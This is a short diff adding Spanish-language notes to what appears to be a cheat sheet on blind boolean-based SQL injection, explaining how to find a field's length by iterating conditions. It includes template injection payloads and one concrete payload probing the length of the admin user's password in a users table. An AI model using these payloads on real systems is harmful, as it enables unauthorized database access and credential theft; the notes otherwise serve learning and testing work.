@@ -99,3 +99,12 @@ revisar el comportamiento del site es indispensable para identificar mejor si se
 de igual manera consultar fields especificos seria simplemente cambiando el query y agregando la funcion WHERE, de la siguiente forma.
 
 ' and select [field] from [table_name] where [field]='[value]')='[value]'--
+
+enumerar un campo string por medio de consultas booleanas abusando del mismo comportamiento ! 
+para enumerar el tamano del campo, es necesario iterar el numero uno hasta no tener mas expected responses. esta consulta enumera el campo spaceXspace para definir el tamano total.
+
+' and select [field_name] from [table_name] where [field_name]='[value]' and LENGTH(field_name)>1)='value'--
+' and select username from users where username='admin' and LENGTH(password)>1)='admin'--
+
+
+
